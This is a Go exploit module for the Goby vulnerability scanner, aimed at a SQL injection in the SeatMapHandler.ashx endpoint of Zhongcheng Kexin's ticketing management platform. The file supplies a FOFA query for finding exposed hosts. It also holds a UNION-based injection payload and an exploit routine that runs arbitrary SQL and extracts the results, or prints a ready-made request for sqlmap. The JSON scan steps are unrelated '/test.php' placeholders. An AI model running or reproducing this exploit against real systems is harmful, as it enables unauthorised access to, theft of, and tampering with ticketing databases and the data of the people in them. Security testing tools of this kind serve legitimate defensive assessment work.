package exploits

import (
	"errors"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "zckxid SeatMapHandler.ashx SQL Injection Vulnerability",
    "Description": "<p>The Zhongcheng Kexin Ticketing Business Comprehensive Management Platform has high requirements for big data processing capabilities, high concurrency response time, and stability in harsh environments. The business comprehensive management platform features comprehensive real-time ticketing supervision and statistical functions, which significantly enhance the modernization management level of tourist attractions, bringing notable economic benefits and social efficiency.</p>",
    "Product": "zckxid",
    "Homepage": "http://exhibition.zckxid.com/",
    "DisclosureDate": "2024-08-15",
    "PostTime": "2024-08-15",
    "Author": "1538279017@qq.com",
    "FofaQuery": "body=\"技术支持：北京中成科信科技发展有限公司\" && body=\"images/login/img_distri.png\"",
    "GobyQuery": "body=\"技术支持：北京中成科信科技发展有限公司\" && body=\"images/login/img_distri.png\"",
    "Level": "2",
    "Impact": "<p>SQL injection attacks can lead to the exposure, manipulation, or deletion of sensitive data in the database, and may even allow the attacker to gain control over the entire system.</p>",
    "Recommendation": "<p>Use prepared statements or parameterized queries instead of directly concatenating SQL statements to prevent malicious inputs from being executed as code.4o</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "@@version",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "中成科信票务管理系统 SeatMapHandler.ashx SQL 注入漏洞",
            "Product": "中成科信",
            "Description": "<p>中成科信票务业务综合管理平台对大数据处理能力，高并发量响应时间、严苛环境稳定性等指标有较高要求。业务综合管理平台具有全方位的票务实时监管和统计功能，对于提高旅游景区的现代化管理水平有着显著的经济效益和社会效率。<br></p>",
            "Recommendation": "<p>使用预处理语句（Prepared Statements）或参数化查询（Parameterized Queries）代替直接拼接 SQL 语句，以避免恶意输入被执行为代码。<br></p>",
            "Impact": "<p>SQL注入攻击可能会导致数据库中的敏感数据泄露、篡改或删除，甚至可能让攻击者获得对整个系统的控制权<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "zckxid SeatMapHandler.ashx SQL Injection Vulnerability",
            "Product": "zckxid",
            "Description": "<p>The Zhongcheng Kexin Ticketing Business Comprehensive Management Platform has high requirements for big data processing capabilities, high concurrency response time, and stability in harsh environments. The business comprehensive management platform features comprehensive real-time ticketing supervision and statistical functions, which significantly enhance the modernization management level of tourist attractions, bringing notable economic benefits and social efficiency.<br></p>",
            "Recommendation": "<p>Use prepared statements or parameterized queries instead of directly concatenating SQL statements to prevent malicious inputs from being executed as code.4o<br></p>",
            "Impact": "<p>SQL injection attacks can lead to the exposure, manipulation, or deletion of sensitive data in the database, and may even allow the attacker to gain control over the entire system.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9932"
}`

	sendPayloadsajckhdhfdh := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		//POST请求
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		//按需求选择自己的发包方式

		//---------------------------------------------
		//以下是发包具体内容,这里以POST请求为例
		//---------------------------------------------
		//漏洞的url
		url := `/SystemManager/Comm/SeatMapHandler.ashx`
		//拼接sql语句
		body := "Method=GetZoneInfo&solutionNo=1'+UNION+ALL+SELECT+" + sql + "%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+hmFo"
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
			"Accept-Encoding": "gzip, deflate",
			"Dnt":             "1",
			"Referer":         hostInfo.FixedHostInfo,
			"Content-Type":    "application/x-www-form-urlencoded",
			"Cookie":          "SESS_IDS=prar0e5k1sg95nfsi446rejfp6",
		}
		resp, err := setPostRequest(hostInfo, url, body, header)
		if err != nil {
			return nil, err
		}
		//状态码可自定义,这里默认200
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayloadsajckhdhfdh
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符

			//检测逻辑,联合注入检测 这里模仿了sqlmap的检测逻辑,让它成功执行sql语句并回显一个字符串,然后我们去匹配

			//如果是其他类型的注入,请按照具体情况进行检测
			sql := "CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28117%29%2BCHAR%2865%29%2BCHAR%28122%29%2BCHAR%28103%29%2BCHAR%2871%29%2BCHAR%2883%29%2BCHAR%28116%29%2BCHAR%28122%29%2BCHAR%2867%29%2BCHAR%28114%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%2887%29%2BCHAR%2889%29%2BCHAR%2872%29%2BCHAR%28101%29%2BCHAR%28118%29%2BCHAR%2880%29%2BCHAR%28108%29%2BCHAR%2873%29%2BCHAR%2881%29%2BCHAR%2867%29%2BCHAR%28104%29%2BCHAR%28105%29%2BCHAR%2866%29%2BCHAR%28105%29%2BCHAR%28107%29%2BCHAR%2865%29%2BCHAR%28120%29%2BCHAR%2873%29%2BCHAR%28119%29%2BCHAR%28114%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%2878%29%2BCHAR%2872%29%2BCHAR%28108%29%2BCHAR%28119%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28113%29"
			resp, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, "qjvzqzuAzgGStzCrvbWYHevPlIQChiBikAxIwrxjNHlwpqzpqq") {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/SystemManager/Comm/SeatMapHandler.ashx`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayloadsajckhdhfdh
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			//Switch ExpParams
			//若自己修改ExpParams,请自行修改switch case
			switch attackType {
			case "sql":
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}

				// 正则匹配利用结果,需自己修改
				// 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
				// 使用 (?s) 修饰符启用单行模式
				pattern := `"seatmapNo":\s*"(.*?)"`

				// 编译正则表达式，带 (?s) 修饰符
				re := regexp.MustCompile(`(?s)` + pattern)

				// 查找匹配的字符串
				match := re.FindStringSubmatch(resp.Utf8Html)
				if len(match) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true

				expResult.Output = `The key points you need to extract is : ` + match[1]
				return expResult

			case "sqlPoint":
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				//sqlPoint,给用户跑sqlmap用,需修改对应的参数
				expResult.Success = true
				expResult.Output = `POST /SystemManager/Comm/SeatMapHandler.ashx HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
Cookie: SESS_IDS=prar0e5k1sg95nfsi446rejfp6
Content-Type: application/x-www-form-urlencoded

Method=GetZoneInfo&solutionNo=1*
`
				return expResult
			//检查ExpParams是否设置正确
			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))
}
